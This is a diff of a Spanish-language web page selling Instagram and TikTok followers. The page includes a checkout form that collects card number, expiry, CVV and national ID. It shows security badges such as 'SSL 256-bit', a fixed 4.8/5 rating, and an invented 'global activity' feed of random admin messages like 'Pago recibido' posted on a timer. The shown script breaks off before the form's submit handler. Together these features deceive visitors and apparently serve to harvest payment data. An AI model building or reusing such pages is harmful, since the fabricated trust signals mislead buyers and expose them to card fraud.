@@ -1,345 +1,498 @@
 <!doctype html>
 <html lang="es">
- <head>
+<head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SocialBoost Arg | Agencia de Crecimiento</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&amp;display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>SocialBoost Arg | Official Partner</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-      --tt-color: #00f2ea;
-      --accent: #833ab4;
-      --wsp-green: #25D366;
+      --primary-grad: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
+      --dark-card: #16161a;
+      --border-soft: rgba(255, 255, 255, 0.08);
+      --success: #22c55e;
+      --text-muted: #94a3b8;
     }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Poppins', sans-serif;
-      background-color: #0a0a0b;
-      color: #ffffff;
-      line-height: 1.6;
-      padding-bottom: 100px;
-    }
-    .container { max-width: 800px; margin: 0 auto; padding: 0 20px; transition: opacity 0.4s ease; }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
     
-    header { padding: 50px 0; text-align: center; }
-    header h1 { font-size: 2.8rem; font-weight: 700; letter-spacing: -1px; margin-bottom: 10px; }
-    .hero-gradient { background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-
-    .public-notice {
-      background: rgba(255, 193, 7, 0.1);
-      border: 1px solid #ffc107;
-      border-radius: 12px;
-      padding: 15px;
-      margin-bottom: 25px;
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      font-size: 0.9rem;
-      color: #ffc107;
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #0c0c0e;
+      color: #f8fafc;
+      line-height: 1.5;
+      padding-top: 70px;
     }
 
-    .free-trial-box {
-      background: rgba(37, 211, 102, 0.05);
-      border: 1px dashed var(--wsp-green);
-      border-radius: 12px;
-      padding: 20px;
-      margin-bottom: 25px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      transition: 0.3s;
+    nav {
+      position: fixed; top: 0; left: 0; width: 100%; height: 65px;
+      background: rgba(12, 12, 14, 0.8); backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border-soft);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 20px; z-index: 1000;
     }
-    .free-trial-box:hover { background: rgba(37, 211, 102, 0.1); }
-    .free-trial-info h4 { color: var(--wsp-green); font-size: 1.1rem; margin-bottom: 4px; }
-    .free-trial-info p { font-size: 0.85rem; color: #aaa; }
-    .btn-free {
-      background: var(--wsp-green);
-      color: #fff;
-      border: none;
-      padding: 10px 18px;
-      border-radius: 8px;
-      font-weight: 700;
-      font-size: 0.85rem;
-      cursor: pointer;
-      text-decoration: none;
-      white-space: nowrap;
+    .logo { font-size: 1.2rem; font-weight: 800; letter-spacing: -0.5px; }
+    .logo span { background: var(--primary-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    
+    .status-pill {
+      display: flex; align-items: center; gap: 6px;
+      background: rgba(34, 197, 94, 0.1); color: var(--success);
+      padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 700;
     }
+    .pulse-dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; animation: pulse 2s infinite; }
 
-    .platform-selector { display: flex; gap: 10px; margin-bottom: 30px; }
-    .platform-btn {
-      flex: 1; padding: 15px; border-radius: 12px; border: 1px solid #333;
-      background: #151515; color: #fff; cursor: pointer; font-weight: 600; transition: 0.3s;
-    }
-    .platform-btn.active[data-platform="ig"] { border-color: #e1306c; box-shadow: 0 0 15px rgba(225, 48, 108, 0.3); }
-    .platform-btn.active[data-platform="tt"] { border-color: var(--tt-color); box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-    .input-group { margin-bottom: 25px; }
-    .input-group label { display: block; margin-bottom: 8px; font-size: 0.9rem; color: #888; }
-    input {
-      width: 100%; padding: 16px; background: #151515; color: #fff;
-      border: 1px solid #333; border-radius: 12px; font-size: 1rem; transition: 0.3s;
-    }
-    input:focus { outline: none; border-color: var(--accent); background: #1a1a1a; }
+    .container { max-width: 500px; margin: 0 auto; padding: 20px; }
 
-    .cards { display: grid; grid-template-columns: 1fr; gap: 12px; margin-bottom: 30px; }
-    .card {
-      background: #151515; padding: 20px; border-radius: 12px;
-      border: 1px solid #333; cursor: pointer; display: flex;
+    .hero { text-align: center; margin-bottom: 30px; }
+    .hero h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 10px; line-height: 1.2; }
+    .hero p { color: var(--text-muted); font-size: 0.9rem; }
+
+    .platform-tabs {
+      display: flex; background: #1a1a1e; padding: 5px; border-radius: 14px; margin-bottom: 25px;
+    }
+    .tab-btn {
+      flex: 1; padding: 12px; border: none; border-radius: 10px;
+      background: transparent; color: var(--text-muted); font-weight: 700;
+      font-size: 0.85rem; transition: 0.3s; cursor: pointer;
+    }
+    .tab-btn.active { background: #2d2d35; color: #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+
+    .input-field { margin-bottom: 20px; }
+    .input-field label { display: block; font-size: 0.75rem; font-weight: 700; color: #555; margin-bottom: 8px; text-transform: uppercase; }
+    input, textarea {
+      width: 100%; padding: 16px; background: var(--dark-card); color: #fff;
+      border: 1px solid var(--border-soft); border-radius: 14px; font-size: 1rem;
+    }
+    input:focus { outline: none; border-color: #833ab4; background: #1c1c21; }
+
+    .package-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 30px; }
+    .pkg-item {
+      background: var(--dark-card); padding: 18px; border-radius: 16px;
+      border: 1px solid var(--border-soft); display: flex;
       justify-content: space-between; align-items: center; transition: 0.2s;
     }
-    .card:hover { border-color: #555; transform: scale(1.01); }
-    .card.selected { border-color: var(--accent); background: rgba(131, 58, 180, 0.05); }
-    .card-info { display: flex; align-items: center; gap: 15px; }
-    .card-info img { width: 30px; }
-    .price { font-weight: 700; color: #00ffd5; }
+    .pkg-item.selected { border-color: #833ab4; background: rgba(131, 58, 180, 0.05); }
+    .pkg-name { font-weight: 600; font-size: 0.95rem; }
+    .pkg-price { font-weight: 800; color: #fff; }
 
-    .btn-main {
-      width: 100%; padding: 18px; border-radius: 12px; border: none;
-      background: var(--ig-gradient); color: #fff; font-size: 1.1rem;
-      font-weight: 700; cursor: pointer; transition: 0.3s;
+    .btn-submit {
+      width: 100%; padding: 18px; border-radius: 16px; border: none;
+      background: var(--primary-grad); color: #fff; font-size: 1rem;
+      font-weight: 800; cursor: pointer; box-shadow: 0 10px 20px rgba(220, 39, 67, 0.2);
     }
-    .btn-main:hover { opacity: 0.9; transform: translateY(-2px); }
 
-    .toast {
-      position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-      background: #ff5252; color: white; padding: 12px 25px;
-      border-radius: 30px; font-weight: 500; z-index: 2000;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: none;
-      animation: fadeInDown 0.4s ease;
+    .reviews-header { display: flex; justify-content: space-between; align-items: center; margin-top: 50px; margin-bottom: 20px; }
+    .comment-card {
+      background: var(--dark-card); padding: 15px; border-radius: 16px; margin-bottom: 15px;
+      border: 1px solid var(--border-soft); position: relative;
     }
-    @keyframes fadeInDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
+    .stars { color: #fbbf24; font-size: 0.8rem; margin-bottom: 5px; }
+    .comment-user { font-size: 0.85rem; font-weight: 700; margin-bottom: 4px; }
+    .comment-text { font-size: 0.8rem; color: var(--text-muted); }
+    .del-btn { position: absolute; top: 15px; right: 15px; color: #ef4444; font-size: 0.7rem; font-weight: 700; cursor: pointer; }
 
-    .payment-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-    .full-width { grid-column: 1 / span 2; }
-    
-    #loadingOverlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.95); display: none; flex-direction: column;
-      align-items: center; justify-content: center; z-index: 1000;
+    .community-btn {
+      position: fixed; bottom: 20px; left: 20px; width: 55px; height: 55px;
+      background: #1a1a1e; border: 1px solid var(--border-soft); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; z-index: 1001;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
     }
-    .spinner { border: 4px solid #333; border-top: 4px solid var(--accent); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-    .wsp-float {
-      position: fixed; width: 60px; height: 60px; bottom: 20px; right: 20px;
-      background-color: var(--wsp-green); border-radius: 50%; text-align: center;
-      z-index: 999; display: flex; align-items: center; justify-content: center;
-      box-shadow: 0px 5px 15px rgba(0,0,0,0.3); animation: wsp-pulse 2s infinite;
-      transition: 0.3s;
+    .chat-bubble {
+      position: fixed; bottom: 85px; left: 20px; width: 280px; max-height: 350px;
+      background: #16161a; border: 1px solid var(--border-soft); border-radius: 20px;
+      display: none; flex-direction: column; overflow: hidden; z-index: 1001;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.6);
     }
-    @keyframes wsp-pulse { 0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(37, 211, 102, 0); } 100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); } }
+    .chat-top { background: #1f1f24; padding: 12px; font-size: 0.75rem; font-weight: 800; border-bottom: 1px solid var(--border-soft); }
+    #chatHistory { padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; font-size: 0.75rem; }
+    .chat-msg { background: rgba(255,255,255,0.03); padding: 8px 12px; border-radius: 10px; border-left: 2px solid #833ab4; }
 
-    footer { text-align: center; padding: 40px; color: #444; font-size: 0.8rem; border-top: 1px solid #111; margin-top: 50px; }
+    .wsp-btn {
+      position: fixed; bottom: 20px; right: 20px; width: 55px; height: 55px;
+      background: var(--success); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; z-index: 1001;
+      box-shadow: 0 10px 25px rgba(34, 197, 94, 0.3);
+    }
+
+    #loading {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+      display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 2000;
+    }
+    .spinner { border: 3px solid #222; border-top: 3px solid #833ab4; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Alerta Minimalista Corregida */
+    #customAlert {
+      position: fixed; 
+      top: 20px; 
+      left: 50%; 
+      transform: translateX(-50%) translateY(-200px); /* Totalmente oculto arriba */
+      background: rgba(25, 25, 30, 0.95);
+      color: #fff; 
+      padding: 16px 30px; 
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.1); /* Sin borde violeta */
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+      z-index: 5000; 
+      transition: transform 0.5s cubic-bezier(0.19, 1, 0.22, 1);
+      font-size: 0.85rem; 
+      font-weight: 600; 
+      text-align: center; 
+      min-width: 300px;
+      backdrop-filter: blur(10px);
+    }
+    #customAlert.show { transform: translateX(-50%) translateY(70px); } /* Baja por debajo del nav */
+
+    footer { text-align: center; padding: 40px 20px; color: #334155; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+
+.free-trial-box {
+  background: rgba(34, 197, 94, 0.05);
+  border: 2px dashed #22c55e;
+  padding: 20px;
+  border-radius: 16px;
+  margin-top: 25px;
+  margin-bottom: 25px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.free-trial-info h4 { color: #22c55e; font-size: 1rem; margin-bottom: 4px; }
+.free-trial-info p { font-size: 0.85rem !important; color: #94a3b8 !important; }
+
+.btn-free {
+  background: #22c55e;
+  color: #fff;
+  padding: 10px 18px;
+  border-radius: 12px;
+  font-weight: 800;
+  font-size: 0.85rem;
+  white-space: nowrap;
+  transition: 0.3s;
+  cursor: pointer;
+  text-decoration: none;
+}
+
+.btn-free:hover { transform: scale(1.05); }
+  /* --- ESTILOS DE ENFOQUE VERDE Y LOGOS --- */
+
+/* 1. El borde verde al tocar cualquier casilla (Input o Textarea) */
+input:focus, textarea:focus {
+  outline: none; /* Quita el borde azul feo por defecto */
+  border-color: #22c55e !important; /* El verde exacto de tus imágenes */
+  background-color: #1a1a1e !important; /* Un fondo gris oscuro sutil */
+  box-shadow: 0 0 12px rgba(34, 197, 94, 0.2) !important; /* Brillo suave verde */
+  transition: all 0.3s ease; /* Suaviza el cambio */
+}
+
+/* 2. Estilo para el texto "SISTEMA DE PAGO CIFRADO" y los logos */
+#cardForm h4 {
+  color: #22c55e !important; /* Texto verde */
+  text-transform: uppercase; /* Todo en mayúsculas */
+  font-size: 0.75rem !important; /* Tamaño pequeño */
+  font-weight: 800 !important; /* Muy negrita */
+  letter-spacing: 1.5px; /* Espaciado entre letras */
+  text-align: center;
+  margin-bottom: 25px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px; /* Espacio entre el escudo y el texto */
+}
+
+/* Agregamos el icono del escudo antes del texto de pago */
+#cardForm h4::before {
+  content: url('data:image/svg+xml;utf8,<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="%2322c55e" stroke-width="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>');
+  display: inline-block;
+  vertical-align: middle;
+}
+
   </style>
- </head>
- <body>
+</head>
+<body>
 
-  <div id="customToast" class="toast"></div>
+  <div id="customAlert"></div>
+
+  <nav>
+    <div class="logo"><span>SocialBoost</span> Arg</div>
+    <div class="status-pill"><div class="pulse-dot"></div> RED ESTABLE</div>
+  </nav>
 
   <div id="step1" class="container">
-    <header>
-      <h1><span class="hero-gradient">SocialBoost</span> Arg</h1>
-      <p>Servicios de alta retención garantizados</p>
-    </header>
-
-    <div class="public-notice">
-      <span>⚠️</span>
-      <p><strong>IMPORTANTE:</strong> Perfil siempre en <strong>PÚBLICO</strong>.</p>
+    <div class="hero">
+      <h1>Optimización de <br>Alcance Social</h1>
+      <p>Servicios de alta retención para marcas y creadores.</p>
+      <div class="free-trial-box">
+  <div class="free-trial-info">
+    <h4>¿Dudas del servicio?</h4>
+    <p>Pedí 10 seguidores GRATIS por WhatsApp.</p>
+  </div>
+  <a onclick="enviarPruebaWsp()" class="btn-free">Probar Gratis</a>
+</div>
     </div>
 
-    <div class="free-trial-box">
-      <div class="free-trial-info">
-        <h4>¿Dudas del servicio?</h4>
-        <p>Pedí 10 seguidores GRATIS por WhatsApp para probar.</p>
-      </div>
-      <a href="javascript:void(0)" onclick="requestFreeTrial()" class="btn-free">Probar Gratis</a>
+    <div class="platform-tabs">
+      <button class="tab-btn active" id="tab-ig" onclick="switchPlatform('ig')">Instagram</button>
+      <button class="tab-btn" id="tab-tt" onclick="switchPlatform('tt')">TikTok</button>
     </div>
 
-    <div class="platform-selector">
-      <button class="platform-btn active" data-platform="ig" onclick="switchPlatform('ig')">Instagram</button>
-      <button class="platform-btn" data-platform="tt" onclick="switchPlatform('tt')">TikTok</button>
+    <div class="input-field">
+      <label>Usuario Oficial</label>
+      <input type="text" id="username" placeholder="@ejemplo" autocomplete="off">
     </div>
 
-    <div class="input-group">
-      <label>Usuario del perfil (sin @)</label>
-      <input type="text" id="username" placeholder="ej: leomessi" autocomplete="off">
+    <div class="package-list" id="packItems"></div>
+
+    <button class="btn-submit" onclick="goToStep2()">GESTIONAR PEDIDO SEGURO</button>
+
+    <div class="reviews-header">
+      <h3>Testimonios</h3>
+      <span style="font-size: 0.7rem; color: #666; font-weight: 800;">TOTAL: 4.8/5 ⭐</span>
     </div>
 
-    <div class="cards" id="packList"></div>
+    <div class="input-field" style="background: #111; padding: 15px; border-radius: 15px;">
+      <div id="starInput" style="margin-bottom: 10px; font-size: 1.2rem; cursor: pointer;">
+        <span data-v="1">☆</span><span data-v="2">☆</span><span data-v="3">☆</span><span data-v="4">☆</span><span data-v="5">☆</span>
+      </div>
+      <textarea id="revText" rows="2" placeholder="Tu experiencia..." style="font-size: 0.85rem; padding: 12px;"></textarea>
+      <button onclick="addReview()" style="width: 100%; margin-top: 10px; background: #222; color: #fff; border: none; padding: 10px; border-radius: 10px; font-weight: 700; font-size: 0.75rem;">PUBLICAR</button>
+    </div>
 
-    <button class="btn-main" onclick="goToStep2()">Continuar al Pago</button>
+    <div id="reviewContainer" style="margin-top: 20px;"></div>
   </div>
 
-  <div id="step2" class="container" style="display:none; margin-top: 50px;">
-    <h2 style="margin-bottom:20px; text-align:center;">Finalizar Pedido</h2>
-    <div id="orderSummary" style="background:#151515; padding:20px; border-radius:12px; margin-bottom:20px; border:1px dashed #333;"></div>
-    <button class="btn-main" onclick="showCreditCard()" style="background:#fff; color:#000; margin-bottom:15px;">💳 Pagar con Tarjeta</button>
-    <button class="btn-main" onclick="payWithMP()" style="background:#009ee3;">💸 Mercado Pago</button>
-    <p style="text-align:center; margin-top:15px; color:#666; cursor:pointer;" onclick="location.reload()">← Volver atrás</p>
+  <div id="step2" class="container" style="display:none;">
+    <div style="background: var(--dark-card); padding: 30px; border-radius: 25px; border: 1px solid var(--border-soft);">
+      <h3 style="text-align:center; margin-bottom: 25px;">Verificación de Orden</h3>
+      <div id="checkoutInfo" style="margin-bottom: 25px; font-size: 0.9rem;"></div>
+      <button class="btn-submit" onclick="showCard()" style="background: #fff; color: #000; margin-bottom: 12px;">TARJETA CRÉDITO/DÉBITO</button>
+      <button class="btn-submit" onclick="payWithMP()" style="background: #009ee3;">MERCADO PAGO</button>
+      <p onclick="location.reload()" style="text-align:center; margin-top: 20px; font-size: 0.8rem; color: #555; font-weight: 700;">← CANCELAR</p>
+    </div>
   </div>
 
-  <div id="step3" class="container" style="display:none; margin-top: 40px;">
-    <h3 style="margin-bottom:20px;">Datos de Facturación Segura</h3>
-    <form id="proPaymentForm" class="payment-grid">
-      <div class="input-group full-width">
-        <input type="text" id="cardName" placeholder="Nombre completo del titular" required>
-      </div>
-      <div class="input-group full-width">
-        <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" pattern="[0-9 ]{19}" minlength="19" maxlength="19" required>
-      </div>
-      <div class="input-group">
-        <input type="tel" id="cardExpiry" placeholder="MM/AA" inputmode="numeric" pattern="[0-9/]{5}" minlength="5" maxlength="5" required>
-      </div>
-      <div class="input-group">
-        <input type="tel" id="cardCvc" placeholder="CVV" inputmode="numeric" pattern="[0-9]{3}" minlength="3" maxlength="3" required>
-      </div>
-      <div class="input-group full-width">
-        <input type="tel" id="cardDni" placeholder="DNI del titular" inputmode="numeric" minlength="10" maxlength="10" required>
-      </div>
-      <button type="submit" class="btn-main full-width">Procesar Pago Seguro</button>
-    </form>
-    <div id="paymentError" style="color:#ff5252; margin-top:15px; text-align:center; display:none;"></div>
+  <div id="step3" class="container" style="display:none;">
+    <div style="background: var(--dark-card); padding: 30px; border-radius: 25px; border: 1px solid var(--border-soft);">
+      <h4 style="margin-bottom: 20px; text-align: center;">Pasarela Bancaria Cifrada</h4>
+      <div style="display: flex; align-items: center; justify-content: center; gap: 8px; color: #22c55e; font-weight: 800; font-size: 0.75rem; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 20px;">
+  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+  SISTEMA DE PAGO CIFRADO
+</div>
+      <form id="cardForm" style="display: flex; flex-direction: column; gap: 12px;">
+        <input type="text" id="cName" placeholder="Nombre completo del titular" required>
+        <input type="tel" id="cNum" placeholder="Número de tarjeta" maxlength="19" required>
+        <div style="display: flex; gap: 10px;">
+          <input type="tel" id="cExp" placeholder="MM/AA" maxlength="5" required>
+          <input type="tel" id="cCvc" placeholder="CVV" maxlength="3" required>
+        </div>
+        <input type="tel" id="cDni" placeholder="DNI del titular" required>
+        <button type="submit" class="btn-submit">CONFIRMAR PAGO</button>
+        <div style="display: flex; justify-content: center; gap: 15px; margin-top: 25px; opacity: 0.2; filter: grayscale(1);">
+  <img src="https://img.icons8.com/color/48/visa.png" width="28">
+  <img src="https://img.icons8.com/color/48/mastercard.png" width="28">
+</div>
+
+<p style="text-align: center; font-size: 0.6rem; color: #444; margin-top: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">
+  TRANSACCIÓN PROTEGIDA POR SSL 256-BIT ENCRYPTION
+</p>
+
+      </form>
+      <div id="errorMsg" style="color: #f87171; font-size: 0.75rem; text-align: center; margin-top: 15px; display: none; padding: 10px; background: rgba(248,113,113,0.1); border-radius: 10px;"></div>
+    </div>
   </div>
 
-  <div id="loadingOverlay">
-    <div class="spinner"></div>
-    <p id="loadingText" style="margin-top:15px; font-weight:500;">Procesando...</p>
+  <div class="community-btn" onclick="toggleChat()">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+  </div>
+  <div class="chat-bubble" id="chatWindow">
+    <div class="chat-top">ACTIVIDAD GLOBAL</div>
+    <div id="chatHistory"></div>
   </div>
 
-  <a href="https://wa.me/5492477399308" id="mainWsp" class="wsp-float" target="_blank">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width:30px; height:30px; fill:white;"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+  <a href="https://wa.me/5492477399308" class="wsp-btn" target="_blank">
+    <svg width="28" height="28" fill="white" viewBox="0 0 16 16"><path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z"/></svg>
   </a>
 
-  <footer>© 2026 SocialBoost Digital Services S.A. | Conexión Encriptada SSL</footer>
+  <div id="loading">
+    <div class="spinner"></div>
+    <p id="lText" style="margin-top: 15px; font-size: 0.7rem; letter-spacing: 1px; color: #555;">CIFRADO SSL ACTIVO</p>
+  </div>
+
+  <footer>© 2026 SocialBoost Argentina</footer>
 
   <script>
-    let currentPlatform = 'ig';
-    let orderData = { pack: "", price: "", mp: "" };
-    const MY_PHONE = "5492477399308";
+    let currentPlat = 'ig';
+    let selPack = { n: "", p: "", m: "" };
+    let stars = 0;
 
-    const packs = {
+    const data = {
       ig: [
-        { n: "5.000 Seguidores Reales", p: "$10.000", mp: "https://mpago.la/2LuYcHZ" },
-        { n: "10.000 Seguidores Reales", p: "$20.000", mp: "https://mpago.la/2sjx9Px" },
-        { n: "20.500 Seguidores + Regalo", p: "$25.000", mp: "https://mpago.la/1b2fxqd" },
-        { n: "50.000 Seguidores Pro", p: "$31.000", mp: "https://mpago.la/1QkiZTc" },
-        { n: "100.000 Seguidores VIP", p: "$50.000", mp: "https://mpago.la/1YvxWqD" }
+        { n: "5.000 Seguidores", p: "$10.000", m: "https://mpago.la/2LuYcHZ" },
+        { n: "10.000 Seguidores", p: "$20.000", m: "https://mpago.la/2sjx9Px" },
+        { n: "20.500 Seguidores", p: "$25.000", m: "https://mpago.la/1b2fxqd" },
+        { n: "50.000 Seguidores", p: "$31.000", m: "https://mpago.la/1QkiZTc" },
+        { n: "100.000 Seguidores", p: "$50.000", m: "https://mpago.la/1YvxWqD" }
       ],
       tt: [
-        { n: "5.000 Fans TikTok", p: "$10.000", mp: "https://mpago.la/2LuYcHZ" },
-        { n: "10.000 Fans TikTok", p: "$20.000", mp: "https://mpago.la/2sjx9Px" },
-        { n: "20.000 Fans TikTok", p: "$25.000", mp: "https://mpago.la/1b2fxqd" },
-        { n: "50.000 Fans TikTok Pro", p: "$31.000", mp: "https://mpago.la/1QkiZTc" },
-        { n: "100.000 Fans TikTok VIP", p: "$50.000", mp: "https://mpago.la/1YvxWqD" }
+        { n: "5.000 Fans TikTok", p: "$10.000", m: "https://mpago.la/2LuYcHZ" },
+        { n: "10.000 Fans TikTok", p: "$20.000", m: "https://mpago.la/2sjx9Px" },
+        { n: "20.500 Fans TikTok", p: "$25.000", m: "https://mpago.la/1b2fxqd" },
+        { n: "50.000 Fans TikTok", p: "$31.000", m: "https://mpago.la/1QkiZTc" },
+        { n: "100.000 Fans TikTok", p: "$50.000", m: "https://mpago.la/1YvxWqD" }
       ]
     };
 
-    function requestFreeTrial() {
-      const user = document.getElementById('username').value.trim();
-      const platformName = currentPlatform === 'ig' ? 'Instagram' : 'TikTok';
-      if (!user) return showToast("⚠️ Escribí tu usuario antes de pedir la prueba.");
-      
-      const text = encodeURIComponent(`Hola! Me gustaría probar el sistema con los 10 seguidores gratis para mi perfil de ${platformName}: @${user}`);
-      window.open(`https://wa.me/${MY_PHONE}?text=${text}`, '_blank');
+    function showAlert(msg) {
+      const alertBox = document.getElementById('customAlert');
+      alertBox.innerText = msg;
+      alertBox.classList.add('show');
+      setTimeout(() => alertBox.classList.remove('show'), 3000);
     }
 
-    function showToast(msg) {
-      const t = document.getElementById('customToast');
-      t.innerText = msg;
-      t.style.display = 'block';
-      setTimeout(() => t.style.display = 'none', 3000);
+    const bots = ["Admin", "Sistema", "Moderador", "Verificado"];
+    const actions = ["Orden procesada", "Pago recibido", "Prueba enviada", "Nuevo cliente"];
+    function addChat() {
+      const msg = `[${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}] ${bots[Math.floor(Math.random()*bots.length)]}: ${actions[Math.floor(Math.random()*actions.length)]}`;
+      const div = document.createElement('div');
+      div.className = 'chat-msg';
+      div.innerText = msg;
+      const box = document.getElementById('chatHistory');
+      box.prepend(div);
+      if(box.children.length > 8) box.lastChild.remove();
+    }
+    setInterval(addChat, 7000);
+    function toggleChat() { 
+      const win = document.getElementById('chatWindow');
+      win.style.display = win.style.display === 'flex' ? 'none' : 'flex';
+    }
+
+    document.querySelectorAll('#starInput span').forEach((s, idx) => {
+      s.onclick = () => {
+        stars = idx + 1;
+        document.querySelectorAll('#starInput span').forEach((st, i) => {
+          st.innerText = i < stars ? '★' : '☆';
+          st.style.color = i < stars ? '#fbbf24' : '#555';
+        });
+      };
+    });
+
+    function addReview() {
+      const txt = document.getElementById('revText').value;
+      if(!txt || stars === 0) return showAlert("Por favor, califica y escribe tu reseña.");
+      const rev = { id: Date.now(), txt, stars, date: "Hoy" };
+      let revs = JSON.parse(localStorage.getItem('sb_revs') || '[]');
+      revs.push(rev);
+      localStorage.setItem('sb_revs', JSON.stringify(revs));
+      document.getElementById('revText').value = '';
+      renderRevs();
+    }
+
+    function delReview(id) {
